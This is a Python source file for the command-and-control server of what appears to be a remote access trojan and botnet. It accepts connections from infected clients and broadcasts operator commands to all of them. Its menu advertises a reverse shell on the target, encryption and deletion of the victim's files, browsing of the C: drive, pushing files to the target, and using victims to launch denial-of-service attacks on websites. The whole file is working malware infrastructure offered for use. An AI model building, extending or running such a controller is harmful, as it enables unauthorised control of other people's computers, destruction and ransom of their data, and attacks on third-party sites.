import socket
import threading
from matplotlib.pyplot import text
from Network.protocol import Network
from Network.Protocol_sending import File_protocol

ip = input("Enter the ip to listen: ")
port = input("Enter the port to listen: ")

s = socket.create_server((ip, int(port)))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen()
print("Listening...")

client_recv = ""

clients_names = []
clients = []
clients_checked = []

class Client_handling:
    def add_clients():
        for i in range(1, 1001):
            client_name = "client" + str(i)
            clients_names.append(client_name)


Client_handling.add_clients()

class Broadcast:
    def broadcast(mes):
        global client_recv
        for client in clients:
            Network.send_command(client, mes, client_recv)

class Receive:
    def receive():
        for client in clients:
            command_recv = Network.recv_command_server(client)
            print(command_recv)

class Receive_camera:
    def recv_camera():
        for client in clients:
            command_recv = Network.recv_command_server(client)
            print("The url for the camera is: ")
            print(command_recv)

class Handling:
    def handle_client(conn):
        print("Remote commands: \n" + "['reverse_shell'] - get to execute commands on target machine \n" + "['encrypt'] - encrypt a file (path needs to be specified) \n" + "['sysinfo'] - see the targets sistem info \n" + "['botnet'] - use the target machine to DoS sites \n")
        print("File managment: \n" + "['cwd'] - get current working directory of your target machine \n" + "['send_file'] - transfer file to your target machine \n" + "['browse'] - see all the files from C: and then all the files from the responses \n" + "['remove'] - remove a file from your targets machine (path needs to be specifed)")
        while True:
            command = input("Enter a command: ")
            Broadcast.broadcast(command)
            if command == "reverse_shell":
                command_for_reverse = input("Enter a command for the reverse shell: ")
                Broadcast.broadcast(command_for_reverse)
                Receive.receive()
            elif command == "cwd":
                Receive.receive()
            elif command == "send_file":
                path = input("Enter the path for the file: ")
                name_for_file = input("Enter the name of your file: ")
                File_protocol.send_file(conn, path, name_for_file)
                print("File sent")
            elif command == "browse":
                Receive.receive()
            elif command == "remove":
                path_remove = input("Enter the path to remove: ")
                Broadcast.broadcast(path_remove)
                print("The file has been removed")
            elif command == "encrypt":
                path_to_ecnrypt = input("Enter path to the file: ")
                Broadcast.broadcast(path_to_ecnrypt)
            elif command == "sysinfo":
                Receive.receive()
            elif command == "botnet":
                target_url = input("Enter the target url: ")
                Broadcast.broadcast(target_url)
            else:
                print("Invalid command ['{}']".format(command))
class Server:
    def server():
        while True:
            global client_recv
            conn, addr = s.accept()
            
            clients.append(conn)
            client_name = clients_names[0]

            Network.send_command(conn, "CLIENT_NAME", client_name)
            Network.send_command(conn, client_name, client_name)
            clients_names.remove(client_name)

            client_recv_name = Network.recv_command_server(conn)
            client_recv += client_recv_name            

            print("\n" +  "New connection from: {} with the name {}".format(addr, client_recv_name))

            t = threading.Thread(target=Handling.handle_client, args=(conn,))
            t.start()

Server.server()